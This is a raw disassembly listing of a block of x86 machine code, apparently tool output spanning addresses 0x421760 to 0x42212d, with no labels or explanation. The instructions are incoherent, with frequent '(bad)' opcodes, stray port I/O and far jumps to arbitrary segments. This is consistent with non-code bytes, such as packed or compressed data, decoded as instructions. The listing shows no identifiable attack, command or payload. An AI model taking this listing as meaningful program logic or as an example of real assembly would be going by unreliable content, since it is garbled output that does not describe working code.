  421760:	xchg   ebp,eax
  421761:	test   eax,0x4304006b
  421766:	out    dx,al
  421767:	xchg   ebx,edi
  421769:	mov    ebp,0x3a6f246b
  42176e:	ficomp DWORD PTR [ebx-0xb]
  421771:	neg    BYTE PTR [ebx+0x4a382bbe]
  421777:	push   0x68
  421779:	test   ebx,eax
  42177b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42177c:	pop    edx
  42177d:	pop    es
  42177e:	(bad)  
  421780:	in     eax,dx
  421781:	pop    ecx
  421782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421783:	icebp  
  421784:	and    dl,dh
  421786:	cmc    
  421787:	addr16 pop eax
  421789:	aas    
  42178a:	sar    DWORD PTR [edi+0x3ac0071e],1
  421790:	fdivr  QWORD PTR [esi-0x3b45b478]
  421796:	int    0xbf
  421798:	in     eax,dx
  421799:	xchg   ecx,ebx
  42179b:	and    eax,0x9c6a0db
  4217a0:	xchg   esi,eax
  4217a1:	dec    ebp
  4217a2:	cld    
  4217a3:	xor    eax,0xf3590112
  4217a8:	daa    
  4217a9:	fild   QWORD PTR [edx-0x63aeabac]
  4217af:	cld    
  4217b0:	call   0xa018:0xd598ef5d
  4217b7:	test   ebp,edi
  4217b9:	(bad)  
  4217ba:	mov    edi,0xdf349301
  4217bf:	or     BYTE PTR [edi+0x4ae02e44],dh
  4217c5:	push   es
  4217c6:	lock loop 0x42182f
  4217c9:	push   ebx
  4217ca:	lods   eax,DWORD PTR ds:[esi]
  4217cb:	push   0xffffffc0
  4217cd:	rol    esp,1
  4217cf:	push   0xffffff9a
  4217d1:	mov    ds:0x40a4f4aa,al
  4217d6:	ins    DWORD PTR es:[edi],dx
  4217d7:	stos   BYTE PTR es:[edi],al
  4217d8:	mov    ebp,0x31cd7623
  4217dd:	sbb    ah,dh
  4217df:	dec    edi
  4217e0:	push   ebp
  4217e1:	psllq  mm7,QWORD PTR [eax+ecx*1-0x72169c3a]
  4217e9:	sub    cl,BYTE PTR [edi]
  4217eb:	xchg   ebp,eax
  4217ec:	lods   al,BYTE PTR ds:[esi]
  4217ed:	jns    0x421808
  4217ef:	jge    0x4217a8
  4217f1:	out    0xf6,al
  4217f3:	rol    DWORD PTR [edx],cl
  4217f5:	mov    dl,0x3d
  4217f7:	imul   esi,DWORD PTR ds:[edx+0x7ced6647],0xffffff87
  4217ff:	nop
  421800:	js     0x421880
  421802:	leave  
  421803:	or     edi,ecx
  421805:	mov    edi,0x5407d140
  42180a:	mov    BYTE PTR [edx-0x36535149],ch
  421810:	in     eax,0xeb
  421812:	jae    0x4217dc
  421814:	xor    al,0xcd
  421816:	dec    ebx
  421817:	xor    eax,DWORD PTR [ebx-0xc]
  42181a:	jp     0x4217fe
  42181c:	mov    bh,0xe5
  42181e:	xchg   ah,al
  421820:	add    ch,BYTE PTR [ebx+edx*8]
  421823:	fwait
  421824:	dec    ecx
  421825:	fist   DWORD PTR [ebx]
  421827:	push   edx
  421828:	jp     0x421866
  42182a:	ins    DWORD PTR es:[edi],dx
  42182b:	push   0x32b27aaa
  421830:	sub    edi,DWORD PTR [eax-0x38d22013]
  421836:	div    DWORD PTR [eax-0x20]
  421839:	scas   al,BYTE PTR es:[edi]
  42183a:	push   esp
  42183b:	mov    ds:0xb0,al
	...
  421a14:	add    dl,dl
  421a16:	in     al,dx
  421a17:	and    edx,DWORD PTR [ecx]
  421a19:	aas    
  421a1a:	fcomip st,st(2)
  421a1c:	out    dx,eax
  421a1d:	or     DWORD PTR [esi+0x716eacd],ebp
  421a23:	sahf   
  421a24:	mov    edi,0x1cd7f
  421a29:	and    eax,0x6e000007
  421a2e:	ror    dl,cl
  421a30:	out    0x42,al
  421a32:	pop    edx
  421a33:	jbe    0x421aa9
  421a35:	popa   
  421a36:	ffreep st(1)
  421a38:	adc    DWORD PTR [ebx-0x1],ecx
  421a3b:	fcompp 
  421a3d:	enter  0x488,0x9f
  421a41:	aam    0x65
  421a43:	(bad)  [esi-0x13]
  421a46:	mov    ch,0xc9
  421a48:	jmp    0x929c83e3
  421a4d:	in     eax,dx
  421a4e:	sub    BYTE PTR [esi],ah
  421a50:	jb     0x421ab8
  421a52:	xchg   DWORD PTR [eax-0x22],ebp
  421a55:	int    0xd9
  421a57:	inc    eax
  421a58:	sub    al,0xf8
  421a5a:	adc    eax,0x57fef849
  421a5f:	outs   dx,BYTE PTR ds:[esi]
  421a60:	mov    edx,DWORD PTR [eax+0x288fb7ed]
  421a66:	es sub ch,ah
  421a69:	jge    0x421a4e
  421a6b:	jmp    esp
  421a6d:	mov    eax,0x462a8c79
  421a72:	fs ja  0x421ac2
  421a75:	fcmove st,st(5)
  421a77:	pop    edx
  421a78:	les    esi,FWORD PTR [eax+0x770776c4]
  421a7e:	addr16 in al,dx
  421a80:	shufps xmm6,xmm5,0x83
  421a84:	push   ecx
  421a85:	outs   dx,DWORD PTR ds:[si]
  421a87:	xchg   BYTE PTR [eax+0x13],dh
  421a8a:	shr    BYTE PTR [eax-0x12ca9f82],1
  421a90:	cmp    eax,0xe06f8671
  421a95:	aam    0x4
  421a97:	xor    DWORD PTR [ebx+0xa37cb57],edx
  421a9d:	inc    eax
  421a9e:	mov    ebx,0xe3814182
  421aa3:	mov    al,0x0
  421aa5:	in     eax,dx
  421aa6:	dec    esp
  421aa7:	push   edi
  421aa8:	dec    ebx
  421aa9:	cmp    dl,BYTE PTR [edx]
  421aab:	xchg   ebp,eax
  421aac:	mov    al,0xa8
  421aae:	xor    al,0xe
  421ab0:	lds    ecx,FWORD PTR [ebx-0x87216e6]
  421ab6:	jmp    0x58e804f1
  421abb:	mov    cl,0x41
  421abd:	ret    
  421abe:	xchg   BYTE PTR [ebx-0x15],dh
  421ac1:	je     0x421a6f
  421ac3:	adc    bh,dh
  421ac5:	mov    BYTE PTR [edx-0x1fd633a4],bh
  421acb:	(bad)  
  421acc:	call   0x3d15e5ab
  421ad1:	dec    ecx
  421ad2:	jno    0x421ab7
  421ad4:	jl     0x421ae9
  421ad6:	add    ch,BYTE PTR [edi-0x40]
  421ad9:	adc    esp,DWORD PTR [ecx+edi*8]
  421adc:	jns    0x421a71
  421ade:	lahf   
  421adf:	mov    DWORD PTR [edx-0xe],ebx
  421ae2:	jnp    0x421b16
  421ae4:	adc    al,bh
  421ae6:	sahf   
  421ae7:	imul   esi,DWORD PTR [eax+0xf8c278f],0x1c
  421aee:	inc    ecx
  421aef:	inc    esp
  421af0:	adc    DWORD PTR ds:0x132d1dde,esp
  421af6:	jle    0x421b3a
  421af8:	jo     0x421b20
  421afa:	cdq    
  421afb:	aaa    
  421afc:	push   edx
  421afd:	(bad)  
  421afe:	xchg   DWORD PTR [edi+ecx*4-0x76],ecx
  421b02:	stos   DWORD PTR es:[edi],eax
  421b03:	adc    ebp,DWORD PTR [ebp-0x70f09ed0]
  421b09:	aad    0x69
  421b0b:	mov    dh,BYTE PTR [ebp+0x67064834]
  421b11:	popa   
  421b12:	xchg   ebx,eax
  421b13:	stos   BYTE PTR es:[edi],al
  421b14:	test   eax,0xd504008f
  421b19:	cmp    bl,BYTE PTR [edx+ebx*4+0x5238f75b]
  421b20:	bound  ecx,QWORD PTR [ebp-0x35]
  421b23:	or     eax,0x26c43580
  421b28:	popa   
  421b29:	mov    eax,ds:0x161b002a
  421b2e:	mov    ds:0x89f25830,al
  421b33:	in     al,0x9e
  421b35:	and    al,0x74
  421b37:	or     BYTE PTR [edx-0x799070f2],0xee
  421b3e:	push   ebp
  421b3f:	pop    edi
  421b40:	js     0x421b28
  421b42:	inc    esp
  421b43:	sub    bl,BYTE PTR [ebx-0x5e017502]
  421b49:	jmp    0x421bb9
  421b4b:	sbb    eax,0xa250a9d6
  421b50:	in     al,dx
  421b51:	push   0xffffffa6
  421b53:	cmp    al,BYTE PTR ds:0x3ec8267c
  421b59:	inc    esi
  421b5a:	cmp    BYTE PTR [esi-0x34],ah
  421b5d:	frstor [edx]
  421b5f:	ins    BYTE PTR es:[edi],dx
  421b60:	push   edi
  421b61:	jmp    0x421ae4
  421b63:	inc    esp
  421b64:	or     cl,BYTE PTR [ebp-0xc]
  421b67:	dec    ebp
  421b68:	sub    al,0x72
  421b6a:	aad    0x46
  421b6c:	and    dh,ch
  421b6e:	mov    eax,ds:0x1ab78275
  421b73:	std    
  421b74:	jmp    0x421be6
  421b76:	cmp    BYTE PTR [esp+ebx*4],cl
  421b79:	and    al,0x62
  421b7b:	out    0x68,eax
  421b7d:	xchg   ebp,eax
  421b7e:	ret    0xda9
  421b81:	push   esp
  421b82:	xchg   DWORD PTR [ebx+0x6c1140b1],esp
  421b88:	rol    cl,1
  421b8a:	push   esp
  421b8b:	mov    edi,0x9371f1a1
  421b90:	mov    edx,0xecc0ac7
  421b95:	paddsb mm2,mm2
  421b98:	ror    ecx,cl
  421b9a:	adc    ebp,edi
  421b9c:	rol    BYTE PTR [edx+0x7b],cl
  421b9f:	int3   
  421ba0:	inc    ebx
  421ba1:	(bad)  
  421ba2:	dec    esp
  421ba3:	adc    ebx,esi
  421ba5:	xor    al,0x86
  421ba8:	pop    ds
  421ba9:	out    dx,eax
  421baa:	js     0x421b3d
  421bac:	mov    esi,0xfe4bb42e
  421bb1:	inc    esp
  421bb2:	stc    
  421bb3:	jg     0x421be7
  421bb5:	lods   al,BYTE PTR ds:[esi]
  421bb6:	and    BYTE PTR [edi],dl
  421bb8:	add    DWORD PTR ds:0x230544ef,eax
  421bbe:	aad    0x16
  421bc0:	popf   
  421bc1:	mov    al,ds:0x771d7071
  421bc6:	add    BYTE PTR [ebp+0x757776d],0x4a
  421bcd:	call   0x1ff6c1b7
  421bd2:	or     edx,esi
  421bd4:	xor    cl,bl
  421bd6:	inc    edx
  421bd7:	std    
  421bd8:	and    al,0x46
  421bda:	xchg   esi,eax
  421bdb:	pop    edx
  421bdc:	mov    BYTE PTR [edx+ebp*8+0xb],ah
  421be0:	cmp    al,0xed
  421be2:	ficom  DWORD PTR [esi]
  421be4:	ror    DWORD PTR [esi-0x6cb4dd56],cl
  421bea:	xchg   edx,eax
  421beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bec:	in     eax,dx
  421bed:	ins    BYTE PTR es:[edi],dx
  421bee:	sub    edi,DWORD PTR [ebp-0x568777d0]
  421bf4:	xor    BYTE PTR [ecx+ecx*8+0x7b],0xab
  421bf9:	iret   
  421bfa:	xchg   BYTE PTR [edx+0x3ec5397f],bh
  421c00:	push   ebp
  421c01:	mov    dl,0xa9
  421c03:	sbb    DWORD PTR ds:[edi-0x34],esp
  421c07:	out    dx,al
  421c08:	lock jmp 0x9f3e:0x4db4d65a
  421c10:	pop    esi
  421c11:	add    bh,BYTE PTR ds:0x6d24ffd4
  421c17:	stc    
  421c18:	nop
  421c19:	clc    
  421c1a:	fld    DWORD PTR [esi-0x13797e30]
  421c20:	iret   
  421c21:	mov    eax,ds:0x8db7000c
  421c26:	mov    ebp,0xd22d816b
  421c2b:	xchg   edx,eax
  421c2c:	mov    WORD PTR [ecx-0x5f],cs
  421c2f:	adc    ecx,DWORD PTR [edx+0x47]
  421c32:	sti    
  421c33:	(bad)  
  421c34:	clc    
  421c35:	sbb    DWORD PTR [ebp+0x3e],eax
  421c38:	fs nop
  421c3a:	or     BYTE PTR [edx+edx*4-0x544bfec6],bh
  421c41:	and    eax,0x5da552ba
  421c46:	fild   QWORD PTR [ebx+0x1e]
  421c49:	fs push 0xe6d72f83
  421c4f:	out    0x9b,al
  421c51:	in     eax,0x91
  421c53:	inc    esp
  421c54:	fadd   st,st(2)
  421c56:	and    al,0x77
  421c58:	(bad)  
  421c59:	fidivr DWORD PTR [esi+0x1af4a07a]
  421c5f:	adc    dl,BYTE PTR fs:[edi+0x46]
  421c63:	(bad)  
  421c64:	pop    ebx
  421c65:	ins    BYTE PTR es:[edi],dx
  421c66:	jb     0x421c75
  421c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c69:	mov    eax,ds:0x9aa4ede7
  421c6e:	inc    ebx
  421c6f:	add    BYTE PTR [ebx],ch
  421c71:	in     eax,dx
  421c72:	jmp    0xfe225789
  421c77:	xchg   ebp,eax
  421c78:	fcomip st,st(3)
  421c7a:	mov    esi,0x3e7710f3
  421c7f:	pop    eax
  421c80:	jmp    0xadfe:0x7784c65f
  421c87:	pop    edx
  421c88:	icebp  
  421c89:	mov    al,0xb7
  421c8b:	or     DWORD PTR [eax+0xe7a16a9],eax
  421c91:	pop    ss
  421c92:	sub    al,0x93
  421c94:	push   esi
  421c95:	adc    DWORD PTR [edx-0x37],ebp
  421c98:	mov    edx,0xcd244597
  421c9d:	test   DWORD PTR [ebp-0x554aa1b4],esi
  421ca3:	stc    
  421ca4:	add    cl,BYTE PTR [ebx]
  421ca6:	outs   dx,BYTE PTR ds:[esi]
  421ca7:	inc    ebx
  421ca8:	push   ss
  421ca9:	xor    bh,BYTE PTR [ebx-0x321f36f5]
  421caf:	fidivr WORD PTR [esi-0x7a]
  421cb2:	inc    eax
  421cb3:	enter  0x7634,0x7a
  421cb7:	and    DWORD PTR [ecx+eax*4+0x32],ebx
  421cbb:	lahf   
  421cbc:	bound  ecx,QWORD PTR [esi+0xaa32d64]
  421cc2:	cmp    bl,BYTE PTR [ebx]
  421cc4:	push   eax
  421cc5:	fcomp  DWORD PTR [ecx]
  421cc7:	mov    eax,ds:0xc35ce9a1
  421ccc:	call   0x9190619e
  421cd1:	cmp    BYTE PTR [esi],0xef
  421cd4:	pop    esp
  421cd5:	pop    ebp
  421cd6:	imul   ebp,DWORD PTR [ecx+0x19],0x3688099a
  421cdd:	leave  
  421cde:	and    edx,DWORD PTR [ebx+0x3860c74a]
  421ce4:	pop    esi
  421ce5:	outs   dx,BYTE PTR ds:[esi]
  421ce6:	popf   
  421ce7:	rcr    DWORD PTR ss:[esi-0x4e],cl
  421ceb:	and    si,WORD PTR [edi-0x40950424]
  421cf2:	sub    al,0xed
  421cf4:	sbb    DWORD PTR [ecx-0x45356f61],ebp
  421cfa:	xor    eax,0x980fd29f
  421cff:	into   
  421d00:	xchg   edx,eax
  421d01:	sbb    dl,BYTE PTR [esi-0x1d]
  421d04:	test   eax,0x1c827761
  421d09:	or     eax,0xe4a241a1
  421d0e:	sbb    edx,DWORD PTR [eax-0x6a0104c8]
  421d14:	aas    
  421d15:	mov    dl,BYTE PTR [esi]
  421d17:	loopne 0x421cdd
  421d19:	sub    BYTE PTR ds:0x47f080c5,0x84
  421d20:	mov    edx,0xe420b1b7
  421d25:	jae    0x421d30
  421d27:	lock stos DWORD PTR es:[edi],eax
  421d29:	and    BYTE PTR [ecx+0x6bd0dbd6],al
  421d2f:	pop    esp
  421d30:	sbb    al,0xab
  421d32:	xor    DWORD PTR [eax-0x499d2beb],esp
  421d38:	jp     0x421d90
  421d3a:	(bad)
  421d3d:	mov    dh,ah
  421d3f:	and    eax,0xfcfd1130
  421d44:	xchg   edi,eax
  421d45:	xchg   BYTE PTR [ebp-0x1f],ah
  421d48:	pop    eax
  421d49:	jbe    0x421dc7
  421d4b:	push   esp
  421d4c:	mov    DWORD PTR [ecx+0x5cd99701],ebp
  421d52:	stos   BYTE PTR es:[edi],al
  421d53:	pushf  
  421d54:	fsave  [edi-0x3542ed02]
  421d5b:	adc    al,0x42
  421d5d:	imul   edi,DWORD PTR [edx-0x65],0xffffff83
  421d61:	(bad)  
  421d62:	xchg   esi,eax
  421d63:	scas   al,BYTE PTR es:[edi]
  421d64:	aam    0x47
  421d66:	call   0x8a2b:0xd1bd2e8b
  421d6d:	mov    bh,ah
  421d6f:	and    edi,DWORD PTR [esi+0x10]
  421d72:	lahf   
  421d73:	cli    
  421d74:	lock dec edi
  421d76:	sbb    eax,DWORD PTR [ebx-0x6d]
  421d79:	cmc    
  421d7a:	dec    edx
  421d7b:	and    al,0xb2
  421d7d:	out    0xd5,al
  421d7f:	sbb    al,0xe9
  421d81:	aad    0x86
  421d83:	pop    ecx
  421d84:	jl     0x421d0c
  421d86:	sub    ebp,DWORD PTR [esi-0x75af3f0f]
  421d8c:	inc    eax
  421d8d:	xchg   ebx,eax
  421d8e:	pop    ecx
  421d8f:	xor    dh,BYTE PTR [ecx]
  421d91:	cmc    
  421d92:	push   es
  421d93:	out    0xaf,al
  421d95:	inc    edx
  421d96:	jp     0x421dfb
  421d98:	pop    eax
  421d99:	jmp    0x421dc7
  421d9b:	xchg   edx,eax
  421d9c:	out    0x99,al
  421d9e:	jae    0x421d51
  421da0:	or     ebp,DWORD PTR [ecx-0xb]
  421da3:	dec    edi
  421da4:	xchg   DWORD PTR [esi],esi
  421da6:	stos   BYTE PTR es:[edi],al
  421da7:	pop    ebp
  421da8:	push   esp
  421da9:	shl    BYTE PTR [esi+edi*2+0x11],1
  421dad:	sub    DWORD PTR [esi-0x1a],esi
  421db0:	in     eax,dx
  421db1:	sub    eax,0x31758aee
  421db6:	sbb    eax,0xd7a78029
  421dbb:	dec    ebp
  421dbc:	dec    edi
  421dbd:	jne    0x421dc1
  421dbf:	aas    
  421dc0:	cs cmp al,0x4f
  421dc3:	push   edx
  421dc4:	aas    
  421dc5:	imul   ecx,DWORD PTR [edx],0x882aa519
  421dcb:	sar    BYTE PTR [eax+0x4f],1
  421dce:	push   DWORD PTR [eax+edx*1+0x66]
  421dd2:	cdq    
  421dd3:	ficom  WORD PTR [edx]
  421dd5:	mov    dh,0xe1
  421dd7:	add    eax,0xbd86fed
  421ddc:	adc    eax,0x7d453538
  421de1:	ins    BYTE PTR es:[edi],dx
  421de2:	sar    BYTE PTR [ebx],cl
  421de4:	hlt    
  421de5:	rcr    BYTE PTR [ebp-0x184ba8c],0x81
  421dec:	pusha  
  421ded:	(bad)  
  421dee:	fdiv   QWORD PTR [ecx]
  421df0:	call   0xa6f5e4fa
  421df5:	adc    eax,0x29082884
  421dfa:	adc    edx,DWORD PTR [ecx+ebp*4]
  421dfd:	(bad)  
  421dfe:	jge    0x421d84
  421e00:	ret    0x1a8d
  421e03:	arpl   WORD PTR [edi],si
  421e05:	repz or dh,BYTE PTR [eax-0x476a5e2d]
  421e0c:	mov    ss,WORD PTR [edi-0x36]
  421e0f:	cmp    BYTE PTR [edi-0x51],ch
  421e12:	loopne 0x421e20
  421e14:	xor    eax,0xea8a08a1
  421e19:	jle    0x421dae
  421e1b:	pushf  
  421e1c:	xor    DWORD PTR [ebp-0x59397ca8],0xffffff80
  421e23:	and    DWORD PTR [ecx],ebp
  421e25:	imul   edi,DWORD PTR [ebx],0xf8c127a8
  421e2b:	mov    ds:0xb124ef6b,eax
  421e30:	sub    bh,BYTE PTR [eax]
  421e32:	jmp    0xa4d58ef1
  421e37:	fnstcw WORD PTR [ecx+0x8]
  421e3a:	js     0x421e45
  421e3c:	or     DWORD PTR [edi],esi
  421e3e:	pop    edi
  421e3f:	mov    WORD PTR [ecx+edx*1-0x1b5fcb23],fs
  421e46:	xor    esi,0x40a249f6
  421e4c:	ss push 0x8
  421e4f:	mov    esi,0xe8f8c9d5
  421e54:	aas    
  421e55:	dec    ebx
  421e56:	pusha  
  421e57:	test   eax,0xdcf540d6
  421e5c:	push   esp
  421e5d:	mov    ecx,0x5112e0a1
  421e62:	pop    es
  421e63:	out    0x94,eax
  421e65:	sar    BYTE PTR [edx],0xe8
  421e68:	and    eax,0x6dd73284
  421e6d:	aad    0xc3
  421e6f:	pop    ebx
  421e70:	hlt    
  421e71:	fnstcw WORD PTR [eax-0x3a996bd3]
  421e77:	retf   
  421e78:	pop    esi
  421e79:	xchg   ebp,eax
  421e7a:	inc    ebp
  421e7b:	jb     0x421e0d
  421e7d:	mov    ch,BYTE PTR [eax+0x49]
  421e80:	cmp    cl,BYTE PTR [eax+edi*8+0x2a61932e]
  421e87:	xor    DWORD PTR [ebp-0x62],esp
  421e8a:	sbb    BYTE PTR [edx+0x65],bl
  421e8d:	cmp    bl,bh
  421e8f:	(bad)  
  421e90:	pop    ds
  421e91:	mul    BYTE PTR [edi-0x66]
  421e94:	popa   
  421e95:	xchg   esp,eax
  421e96:	jmp    0x421e33
  421e98:	inc    edi
  421e99:	adc    DWORD PTR cs:[ebx-0x68],ecx
  421e9d:	in     al,0x8a
  421e9f:	scas   eax,DWORD PTR es:[edi]
  421ea0:	adc    al,ch
  421ea2:	jmp    0x668796a4
  421ea7:	int3   
  421ea8:	xor    edi,eax
  421eaa:	shl    DWORD PTR ds:0x3f7e74c4,cl
  421eb0:	pop    ebx
  421eb1:	dec    ebx
  421eb2:	mov    ds:0xf25bb6c2,al
  421eb7:	jge    0x421e79
  421eb9:	dec    esi
  421eba:	dec    eax
  421ebb:	repnz mov edx,0xf499d126
  421ec1:	gs into 
  421ec3:	(bad)  
  421ec4:	mov    ds,edi
  421ec6:	popf   
  421ec7:	mov    al,0x2d
  421ec9:	and    esi,esi
  421ecb:	jl     0x421ec4
  421ecd:	mov    es,ebp
  421ecf:	mov    WORD PTR [edi+0x28900fd1],ax
  421ed6:	cmp    BYTE PTR [edi-0x158c3c25],ah
  421edc:	push   ds
  421edd:	or     BYTE PTR [edi+edx*4-0x4f],dl
  421ee1:	and    al,BYTE PTR [esi+0x7ece7bb5]
  421ee7:	xchg   ecx,eax
  421ee8:	xor    eax,0x3ce7707a
  421eed:	or     DWORD PTR [ebp-0x4d22ee22],esp
  421ef3:	scas   eax,DWORD PTR es:[edi]
  421ef4:	js     0x421f55
  421ef6:	pop    ss
  421ef7:	fistp  DWORD PTR [esi]
  421ef9:	and    eax,0x730b9d3
  421efe:	fs fwait
  421f00:	shr    DWORD PTR [ebx+ebp*2+0x55dde729],cl
  421f07:	aaa    
  421f08:	call   0x29f0:0x4de9c366
  421f0f:	idiv   BYTE PTR [edi+0x7ffdcd8d]
  421f15:	add    BYTE PTR [edi-0x711d9dc0],dh
  421f1b:	jb     0x421f80
  421f1d:	cmp    esi,DWORD PTR [ebx-0x13]
  421f20:	add    al,0x5d
  421f22:	dec    edi
  421f23:	mov    ah,0xa8
  421f25:	inc    edi
  421f26:	jle    0x421f55
  421f28:	in     eax,dx
  421f29:	ins    BYTE PTR es:[edi],dx
  421f2a:	test   al,0x8d
  421f2c:	fwait
  421f2d:	sub    eax,DWORD PTR [edi*4-0x7063821c]
  421f34:	fs mov eax,0xe3dfbf44
  421f3a:	xchg   ebp,eax
  421f3b:	into   
  421f3c:	repz xlat BYTE PTR ds:[ebx]
  421f3e:	sbb    esi,DWORD PTR [edx]
  421f40:	nop
  421f41:	sbb    BYTE PTR [ecx+0x6a],0x58
  421f45:	idiv   DWORD PTR [ebp+0xae4e4d6]
  421f4b:	loope  0x421f87
  421f4d:	lods   al,BYTE PTR ds:[esi]
  421f4e:	sti    
  421f4f:	jle    0x421fb9
  421f51:	int    0xc1
  421f53:	dec    edi
  421f54:	cdq    
  421f55:	cmp    al,0xdf
  421f57:	jns    0x421fb0
  421f59:	mov    ebx,0xbcf0ec92
  421f5e:	sbb    ch,bl
  421f60:	mov    edx,0xf41813df
  421f65:	loope  0x421f1a
  421f67:	in     al,0xee
  421f69:	jl     0x421ef8
  421f6b:	mov    ah,0x48
  421f6d:	pop    esp
  421f6e:	out    dx,eax
  421f6f:	pop    edi
  421f70:	jmp    0x421f43
  421f72:	jbe    0x421f3e
  421f74:	dec    esi
  421f75:	(bad)  
  421f76:	sti    
  421f77:	bound  ebp,QWORD PTR [ebx-0x6f02c5e7]
  421f7d:	mov    esi,0x729e16a1
  421f82:	ss ds mov dh,0xc4
  421f86:	loope  0x421fcd
  421f88:	push   edx
  421f89:	and    dl,bh
  421f8b:	inc    edi
  421f8c:	daa    
  421f8d:	rcl    DWORD PTR [esi+0x65],1
  421f90:	push   ds
  421f91:	stos   DWORD PTR es:[edi],eax
  421f92:	sub    dl,BYTE PTR [ebx]
  421f94:	sahf   
  421f95:	add    eax,0x718d49df
  421f9a:	lock rcl BYTE PTR [edi+0x31],cl
  421f9e:	mov    fs,edi
  421fa0:	stos   BYTE PTR es:[edi],al
  421fa1:	test   BYTE PTR [ebx],cl
  421fa3:	and    eax,0xd2d9a1da
  421fa8:	aam    0x53
  421faa:	sub    cl,BYTE PTR [esi+0x7fb6af0e]
  421fb0:	call   0xe1f1:0x2ea4b5c2
  421fb7:	pop    eax
  421fb8:	pop    esp
  421fb9:	and    BYTE PTR [eax-0x8e0628d],cl
  421fbf:	mov    ch,0x40
  421fc1:	add    dl,dh
  421fc3:	in     eax,dx
  421fc4:	dec    edi
  421fc5:	int3   
  421fc6:	jno    0x421f73
  421fc8:	fistp  DWORD PTR [ebx]
  421fca:	push   ss
  421fcb:	loopne 0x421f85
  421fcd:	jge    0x42204b
  421fcf:	mov    dh,0x69
  421fd1:	les    ecx,FWORD PTR [ecx-0x7c00df70]
  421fd7:	out    0x4e,eax
  421fd9:	hlt    
  421fda:	loop   0x422016
  421fdc:	out    dx,al
  421fdd:	outs   dx,BYTE PTR ds:[esi]
  421fde:	iret   
  421fdf:	hlt    
  421fe0:	retf   
  421fe1:	loopne 0x422040
  421fe3:	mov    ecx,0x6518033a
  421fe8:	push   esp
  421fe9:	sub    BYTE PTR [ecx+0x1645da8f],dh
  421fef:	mov    dl,0x12
  421ff1:	cmp    eax,edx
  421ff3:	bound  edi,QWORD PTR [edx]
  421ff5:	add    bl,BYTE PTR [esi+0x3b494be4]
  421ffb:	shl    cl,1
  421ffd:	fistp  QWORD PTR [esi+0x3e]
  422000:	int    0x9
  422002:	adc    DWORD PTR [ebp-0x63],0x4df5f8fc
  422009:	pushf  
  42200a:	mov    edx,0xf0fb8de2
  42200f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422010:	add    dh,dh
  422012:	lods   eax,DWORD PTR ds:[esi]
  422013:	rol    DWORD PTR [edi+0x21d73505],cl
  422019:	xor    BYTE PTR ds:0xc1f801d1,dh
  42201f:	pop    edi
  422020:	dec    eax
  422021:	ror    BYTE PTR [eax+0x16],0x60
  422025:	mov    eax,ds:0x8527f7c8
  42202a:	fwait
  42202b:	inc    ebx
  42202c:	adc    BYTE PTR [esi],bl
  42202e:	retf   0xe7cd
  422031:	ror    BYTE PTR [eax],cl
  422033:	add    cl,0x85
  422036:	arpl   WORD PTR [ebp+ebx*2+0x41],di
  42203a:	(bad)  
  42203b:	popa   
  42203c:	fidiv  DWORD PTR [esi+0x6b]
  42203f:	pop    ebp
  422040:	or     al,0x48
  422042:	mov    bh,0xed
  422044:	inc    eax
  422045:	dec    edi
  422046:	pop    esp
  422047:	dec    ebx
  422048:	mov    BYTE PTR [ebx+eiz*8],bl
  42204b:	push   ss
  42204c:	adc    ch,BYTE PTR [ebx+0x2]
  42204f:	add    BYTE PTR [eax+0x431e91],dh
  422055:	mov    ah,BYTE PTR [eax-0x6f951cf4]
  42205b:	ret    
  42205c:	loope  0x422025
  42205e:	mov    ah,0xb3
  422060:	or     al,BYTE PTR [ebx]
  422062:	ret    0x8dc3
  422065:	inc    ebp
  422066:	imul   esi,ebx,0xf3256ef0
  42206c:	push   ebx
  42206d:	aas    
  42206e:	lods   al,BYTE PTR ds:[esi]
  42206f:	mul    BYTE PTR [eax]
  422071:	loope  0x4220eb
  422073:	call   0x7e4d4f2a
  422078:	outs   dx,BYTE PTR ds:[esi]
  422079:	mov    eax,ds:0xbe8816ba
  42207e:	adc    cl,dh
  422080:	mov    ch,0x30
  422082:	scas   eax,DWORD PTR es:[edi]
  422083:	fadd   QWORD PTR [edx-0x5720db82]
  422089:	or     BYTE PTR [edi],0x5f
  42208c:	shl    BYTE PTR [esi+eax*2+0x35],1
  422090:	mul    BYTE PTR [esi-0x744af7ee]
  422096:	sbb    ebp,DWORD PTR [ebx]
  422098:	mov    cs,WORD PTR [edi+edx*4+0x65]
  42209c:	or     dh,BYTE PTR [ebp+0x2c34e6]
  4220a2:	mov    cl,0x7e
  4220a4:	aaa    
  4220a5:	out    0x22,eax
  4220a7:	bound  ecx,QWORD PTR [ebx+0x847dab0]
  4220ad:	icebp  
  4220ae:	aad    0x4
  4220b0:	adc    eax,0xdfabe250
  4220b5:	lea    eax,[edx+esi*1]
  4220b8:	cli    
  4220b9:	enter  0xbbdc,0xc2
  4220bd:	mov    eax,ds:0x5ee46c27
  4220c2:	in     al,dx
  4220c3:	es pop edi
  4220c5:	lods   al,BYTE PTR ds:[esi]
  4220c6:	pop    edx
  4220c7:	fdiv   QWORD PTR [ebx-0x14baf18e]
  4220cd:	jl     0x4220c5
  4220cf:	mov    ecx,0x29476755
  4220d4:	jb     0x4220d2
  4220d6:	pop    es
  4220d7:	mov    ecx,0xc8720f9d
  4220dc:	or     dh,BYTE PTR [edx]
  4220de:	cmp    eax,0xf1e28151
  4220e3:	mov    DWORD PTR [eax-0x54],0x3d162320
  4220ea:	xor    BYTE PTR [edi-0x74],al
  4220ed:	icebp  
  4220ee:	jb     0x4220fc
  4220f0:	jns    0x422165
  4220f2:	xor    al,0x46
  4220f4:	bound  ecx,QWORD PTR [edi-0x48]
  4220f7:	cmp    DWORD PTR [eax],ebp
  4220f9:	adc    ebx,ecx
  4220fb:	in     eax,dx
  4220fc:	push   ebp
  4220fd:	cmp    ah,ah
  4220ff:	cdq    
  422100:	std    
  422101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422102:	pop    ds
  422103:	sub    eax,0xafd02068
  422108:	adc    cl,BYTE PTR [esp+edx*1-0x4ea7746]
  42210f:	ret    
  422110:	jb     0x422148
  422112:	inc    edx
  422113:	cmp    eax,0xcebff562
  422118:	xor    eax,0x6317a9f4
  42211d:	sbb    esp,DWORD PTR [ebp-0x6ed13db1]
  422123:	mov    bl,0x2b
  422125:	dec    esi
  422126:	sub    eax,0x1174a1bb
  42212b:	arpl   ax,si
  42212d:	call   0x33a9eff
